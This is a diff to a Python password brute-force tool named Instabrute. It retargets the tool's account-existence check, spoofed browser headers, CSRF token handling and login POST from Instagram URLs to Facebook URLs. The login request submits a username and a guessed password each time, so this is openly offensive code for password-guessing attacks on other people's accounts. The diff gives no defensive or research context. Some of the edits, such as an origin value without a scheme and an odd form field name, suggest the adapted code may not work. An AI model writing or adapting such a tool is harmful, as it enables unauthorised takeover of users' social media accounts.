@@ -69,7 +69,7 @@ class Instabrute():
 
 	#Check if username exists in instagram server
 	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.facebook.com/%s/?__a=1' % self.username) 
 		if (r.status_code == 404):
 			print ('[*] User named "%s" not found' % username)
 			Input('[*] Press enter to exit')
@@ -90,23 +90,23 @@ class Instabrute():
 			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
 			'x-instagram-ajax':'1',
 			'X-Requested-With': 'XMLHttpRequest',
-			'origin': 'https://www.instagram.com',
+			'origin': 'www.facebook.com',
 			'ContentType' : 'application/x-www-form-urlencoded',
 			'Connection': 'keep-alive',
 			'Accept': '*/*',
-			'Referer': 'https://www.instagram.com',
-			'authority': 'www.instagram.com',
-			'Host' : 'www.instagram.com',
+			'Referer': 'https://www.facebook.com',
+			'authority': 'www.facebook.com',
+			'Host' : 'www.facebook.com',
 			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
 			'Accept-Encoding' : 'gzip, deflate'
 		})
 
 		#Update token after enter to the site
-		r = sess.get('https://www.instagram.com/') 
+		r = sess.get('https://www.facebook.com/') 
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
 		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
+		r = sess.post('https://www.facebook.com/ajax/', data={'Email or phone':self.username, 'password':password}, allow_redirects=True)
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 		
 		#parse response
